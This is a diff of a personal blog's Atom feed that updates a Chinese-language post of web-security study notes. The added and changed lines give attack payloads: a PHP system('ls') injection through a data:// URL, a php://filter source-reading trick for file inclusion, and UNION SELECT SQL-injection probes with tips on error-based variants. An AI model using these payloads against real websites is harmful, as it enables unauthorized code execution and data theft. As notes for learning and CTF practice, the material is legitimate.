@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://hagemon.github.io</id>
     <title>Hagemon&apos;s Log</title>
-    <updated>2021-06-26T12:09:26.042Z</updated>
+    <updated>2021-06-27T01:12:57.035Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://hagemon.github.io"/>
     <link rel="self" href="https://hagemon.github.io/atom.xml"/>
@@ -340,6 +340,7 @@ Content-Type: application/x-www-form-urlencoded
 &lt;?php system(&quot;ls&quot;); ?&gt;
 </code></pre>
 <h2 id="data协议">data协议</h2>
+<p>在URL中添加<code>data://text/plain,&lt;?php%20system(&quot;ls&quot;);?&gt;</code></p>
 <h1 id="文件包含">文件包含</h1>
 <p>文件包含会执行include的php文件，如果php文件里面同时输出你的输入，以及对某个文件进行包含，那么可以利用这点执行php代码，比如：</p>
 <pre><code class="language-php">&lt;?php
@@ -367,15 +368,17 @@ include($page);
 <pre><code>/index.php?page=php://filter/read=convert.base64-encode/resource=index.php
 </code></pre>
 <h1 id="sql注入的尝试">Sql注入的尝试</h1>
-<p>以正常查询为<code>localhost:8888/index.php?id=1</code>的环境为例，可以做的尝试有：</p>
+<p>以正常查询为<code>localhost:8888/index.php?id=1</code>的环境为例，如果正常输入后有回显（比如查询id=1时，会返回用户信息），可以传入一个不会返回结果的参数（比如查询id为-1的用户，或随便输入的账号密码之类的），并尝试各种格式：</p>
 <ul>
-<li>id=1 union select 1, 2 --+</li>
-<li>id=1' union select 1, 2 --+</li>
-<li>id=1&quot; union select 1, 2 --+</li>
-<li>id=1') union select 1, 2 --+</li>
-<li>id=1&quot;) union select 1,2 --+</li>
+<li>id=-1 union select 1, 2 --+</li>
+<li>id=-1' union select 1, 2 --+</li>
+<li>id=-1&quot; union select 1, 2 --+</li>
+<li>id=-1') union select 1, 2 --+</li>
+<li>id=-1&quot;) union select 1,2 --+</li>
 </ul>
-<p>如果出现列数不对的报错提示，则可以进一步构造payload。</p>
+<p>如果是模糊搜索的场景（比如搜索新闻标题）则需要添加%。</p>
+<p><strong>尝试期间可能输出语法错误，或是没有回显，这两种情况都可以无视，直到尝试出现列数不对的报错提示，或是直接显示1和2，则可以进一步构造payload。</strong></p>
+<p>如果正常输入后不会回显（比如登录等场景），且该问题并不是盲注问题，则需要把union select改成updatexml形式。</p>
 ]]></content>
     </entry>
     <entry>
